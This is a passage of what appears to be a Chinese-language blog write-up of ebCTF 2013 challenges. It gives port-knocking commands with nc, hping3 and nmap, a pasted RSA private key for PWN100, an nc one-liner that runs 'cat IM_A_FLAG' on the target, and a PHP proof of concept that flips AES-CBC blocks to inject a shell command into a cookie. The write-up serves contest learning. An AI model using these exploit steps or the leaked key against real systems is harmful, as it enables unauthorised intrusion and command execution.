<h1>iptables -A INPUT -p tcp -j LOG &mdash;log-prefix &lsquo; INPUT TCP &rsquo; &mdash;log-level 4</h1>

<p>```</p>

<p>接著會在 <code>/var/log/kern.log</code> 拿到記錄，接著再敲回去：</p>

<p>```
$ nc -w 1 54.216.81.14 8112;
$ nc -w 1 54.216.81.14 33386;
$ nc -w 1 54.216.81.14 14712;
$ nc -w 1 54.216.81.14 4398;
$ nc -w 1 54.216.81.14 1771;
$ nc -w 1 54.216.81.14 52313;
$ nc -w 1 54.216.81.14 25697;
$ nc -w 1 54.216.81.14 932;
$ nc -w 1 54.216.81.14 22222;
[Advanced]</p>

<pre><code>    sequence    = 234,781,983,2411,9781,14954,23112,63991
    seq_timeout = 15
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 32154 -j ACCEPT
    tcpflags    = fin,urg,!ack
    cmd_timeout = 30
    stop_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 32154 -j ACCEPT
</code></pre>

<p>```</p>

<p>拿到第三階段的提示了！查了一下發現是 <a href="http://www.zeroflux.org/projects/knock/">knockd</a> 的設定檔，這次會檢查 tcp flags ，我們是用 (hping)[<a href="http://www.hping.org/">http://www.hping.org/</a>] 來設 tcp flags</p>

<p><code>
hping3 -c 1 -F -U -p 234   54.216.81.14
hping3 -c 1 -F -U -p 781   54.216.81.14
hping3 -c 1 -F -U -p 983   54.216.81.14
hping3 -c 1 -F -U -p 2411  54.216.81.14
hping3 -c 1 -F -U -p 9781  54.216.81.14
hping3 -c 1 -F -U -p 14954 54.216.81.14
hping3 -c 1 -F -U -p 23112 54.216.81.14
hping3 -c 1 -F -U -p 63991 54.216.81.14
</code></p>

<p>最後再連 port 32154 就會噴 flag 了！</p>

<h3>Reference</h3>

<pre><code>&lt; ai1&gt; Ghaaf, the final one:

    nmap -vvv -PN --scanflags FINURG 54.216.81.14 -r -p234,781,983,2411,9781,14954,23112,63991 --scan-delay 1

&lt; Tilou&gt; http://pastebin.com/jBr3d9wR &lt;- hping way

    #!/bin/bash
    sequence="234 781 983 2411 9781 14954 23112 63991"
    for port in $sequence; do
        hping -F -U -c 1 -p $port 54.216.81.14 &gt; /dev/null 2&gt;&amp;1
    done
    nc 54.216.81.14 32154
</code></pre>

<ul>
<li><a href="http://ufologists.ufoctf.ru/49/write-ups/ebctf-2013-net200-whos-there-write-up">http://ufologists.ufoctf.ru/49/write-ups/ebctf-2013-net200-whos-there-write-up</a></li>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET300</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET400</h2>

<h3>Reference</h3>

<h2>PWN100</h2>

<h3>Reference</h3>

<pre><code>&lt;@gijs&gt; foundation: pwn100 initial key https://p.6core.net/p/yMz8naU2ZphAAHWjGkY7ICcD

-----BEGIN RSA PRIVATE KEY-----
MIIEoAIBAAKCAQEA8Ew1BzA3rNBwrFYevJ6mJMVfe+ZMrbrq20Q78MIprjxMmEV8
hUiYq4CftCeNj+XxYYuaYLwAA8GfW+wrS04AAEzHTNwc1wKbHdOzvParhiIFOjJ2
NX/ljlQA7LCO0bToMg971gKrFGYPGMa5vKsx9hXyDCLegXHV3G/duPxaG0hkYucC
UrilqtGMFmpFQu+vgDdudEEVg+01BtNanCxOeYuWLnd8ViZx3qrdooPNnhxh1hop
ciYNp5ORQiYKFFCmIxAMRnXYlZt5CbPIbNrRLHKSnrDyOhSLa0e3tjnGYv+YjrHB
OaWQoPu3dOu88ason5jhbTKzZ2gOe24vlg9hdwIBIwKCAQApMaKwxm/xvVUk25A9
l4oyMHbEyGTqlRJReWlceQ51o+/fluIleijM8Xp2p7HeJ2s1SyHHcK+LnYkIcaEF
mFfFiYFAYD91UOdkMuucvJJuxADlZ7x+My6qr1Cdmpwj8yB9nEEdX4sKz6rRDB/X
M0pks04QtYU6ww64Ey1S6W6IVTh/6TNzPc2mEBtHJd7yDI08aY0fbIOf5z4WNPBE
oEYIu6FWTMDf57XaUPclrPNnCturWcAdzw1DgYiyuDaS4YtryDfyaBA+WbepEOEb
HFkMf6jgDfqpnGc+vL8Z3ggoftOHZPdS3NNScrR1zRZbRyLP6DNRPjmIldThIrdv
fb+LAoGBAPzFhrlH84GwoZs+Hd/YFYgQxySGEqSspp6x14wv+7eseUN8Vp/+A11Z
kZfRHrZU5r5eTIlo+ajXeX8Uu04U5A0X3mFXpfsGksPuEvVPPzCHwHIvfsDl2u/3
ymStMDg2DHbAnyncLYUVVMjAVudL7MDq3fz1T44gfAcj+/jQOgwBAoGBAPNd5UeV
MfRcJ1G5RNDm5kTkXegMNXEH1wF+HFTb3v5Ey9A6tnc+Bhpg66QgSYtwIPdll2oF
9Jdw+8oa4tL785ZrzGSTcNQjUrBsE7H/dkPbyXH+4KXMKUEwME2cz7PrZKU4RZ9P
b+WACdIFaH3mn3H38GPIotWqLK2LfQi7d813AoGAVqofj/tpbkswF/gKPh4zRJgJ
w2Eq9qGYNmjcMBBzj25VdjlCRXupYdWRANn75r4F+CBUwWXR8L7n08yX/YOBY5Mn
rFiQrdZeNIwjwdIHCVMdaPpXWBRLEHI2w26UMIePPqhxFaqTQ5JI9F8zvQQWqIsK
SBmXnnGJnAxWY++e34sCgYB2NOu1DfOxNBMZENhINaMLhN0nkObB3zyLskhGeWxP
ncIUrs2nochzNmPTYCO4wW8ZFBZYEYVuIO9TiWbbgbDUCHk4KltfuWKtdlK1irXJ
MD1F/3RtyZBhfc5RlU7w/U4kXSkhflrr0HnMaQbeEO5b7XTCwIma+uKALc8EPcx5
vQKBgBCqEbKrfUF5H1QQunHiIsRE40zJ8MaGZbdT7ZC/bXTcwFnC+m3Ql/Iko3KU
qJ59EAryB5SmrpViNlhl3JL+Pu2m4fNhvxVfBdNSxuJMjodK6n2O4WeF0NUS0bpZ
EZRema+mBXD/lSTh1d9FnEOwrbFFEnuTZfAnEvEFo1m/Qn43
-----END RSA PRIVATE KEY-----
</code></pre>

<h2>PWN200</h2>

<pre><code>$ perl -e 'print "&gt;"x51 . "-"x47 . "\ncat IM_A_FLAG\n"' | nc 176.34.95.148 31313
</code></pre>

<h2>PWN300</h2>

<h3>Reference</h3>

<pre><code>&lt; gna_&gt; pwn300 writeup
&lt; gna_&gt; http://pastebin.com/G0KvW6t6
&lt; bata_&gt; pwn300 http://pastebin.com/gc8u6J3M
</code></pre>

<ul>
<li><a href="http://haxx.in/ebctf_pwn300_sploit.php.txt">http://haxx.in/ebctf_pwn300_sploit.php.txt</a></li>
<li><a href="http://blog.lse.epita.fr/articles/57-ebctf-2013-pwn300.html">http://blog.lse.epita.fr/articles/57-ebctf-2013-pwn300.html</a></li>
</ul>


<h2>PWN400</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/58-ebctf-2013-clownstoragenet---dimwit---pwn-400.html">http://blog.lse.epita.fr/articles/58-ebctf-2013-clownstoragenet---dimwit---pwn-400.html</a></li>
</ul>


<h2>WEB100</h2>

<h3>Reference</h3>

<pre><code>&lt;@gijs&gt; loveldyream: this is what i developed when i tested it
        https://p.6core.net/p/0lAkDRAsvPqj1zeMVz6A5xcl&gt; using blind
        injection but i know the author has a one-liner which will
        return the value directly without using blind injection
</code></pre>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/46">http://hardc0de.ctf.su/archives/46</a></li>
</ul>


<h2>WEB200</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/11">http://hardc0de.ctf.su/archives/11</a></li>
</ul>


<h2>WEB300</h2>

<h3>Reference</h3>

<pre><code>&lt; daniel1024&gt; xpath injection in web100?
&lt; daniel1024&gt; *300
&lt;@gijs&gt; daniel1024: yes xpath injection
&lt; RlIxOTA4&gt; web300 was xpat
&lt; RlIxOTA4&gt; h
</code></pre>

<h2>WEB400</h2>

<p>這題很有趣！雖然我們沒有解出來 XD</p>

<p>一開始要利用 <code>function hmac($data)</code> 裡的 typo 讓我們可以假造合法的 cookie ，
接著再利用 AES CBC mode 解密時會和前一個 block 做 xor 的特性，
只要知道某一段 plaintext 是什麼，就可以在 ciphertext 中 xor 前一個 block ，
讓解出來的 plaintext 變成我們想要的（超抽象 XD ）</p>

<p>沒有寫完整 writeup ，有興趣的人可以看下面的 reference 研究一下 PoC ！</p>

<h3>Reference</h3>

<pre><code>&lt; phiber_&gt; web400 solution http://privatepaste.com/1d0f3254f6

&lt;?php
$a = base64_decode(urldecode('%2FW8w%2BUpwN%2B2vh85b54XcyGM2wSNNFFcBqoGr%2BX5S7FOuJn%2FJBJwp1R1F5VpqsR9NkW82Ut8L5hPFKa%2BWIEs2W9DP9Qnq9zhmAJ5FwbNcY6viYT2kZd1Yz06lplcsnRuaFU8gj5TV9jHX8wps2%2BTaAO68TrHgF3Scvt56BrGAlZX%2Fp24qGKQf5m%2B15RdsgC6M%2BQ9Fl7KhwazU1F9yJ9rx7GH5HsCC4ztYeVVoiFYQQIDMPMHZkIeA7sbYrhH6L9Ej8DlEb2dErkHBVP98Wp5aAxm8jIXeqgBHfPF8s26o%2Bjs2T6XfWm3cv%2FN4yp93yGEpSja7dAr1Bdw3k1TVVPAqzGFBA2SbB6skHQhNiC5hfJ4TdymBfzzt8QLvGT3KKBlQP1sgNcLIpwhFCOGlGkN1Nq7%2Bb2GV5h%2FtyLH%2FTW2LGuVcBCTRXFY7mC0IPV2WCFSTyOddnX5t2sNeU9zBop9WeWQe199f50%2FRKRX4aA%2FLsSrGqv%2F2s4z96n9I0Zu4oGcpb9hGh3zvzGZQy6J4TAeKRKCRsIW3vDFacngSGcUAklS4nsRqXJBVEZ70WcBFQjVI7zMX8cjJS8RiyQLKgGpKirYotsetFk98xonYzbwBnyNLiNFEM0WSsPoDSW2UvQe3NfDEJKwT63l9uaAHTbfWXQ%3D%3D'));
$blocks = str_split($a, 16);
$blocks[22] = $blocks[22] ^ str_repeat('a', 16) ^ "';cat *; echo 'a";
$b = implode('', $blocks);
echo urlencode(base64_encode($b))."\n";
?&gt;
</code></pre>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/43">http://hardc0de.ctf.su/archives/43</a></li>
</ul>

]]></content>
  </entry>
  
</feed>
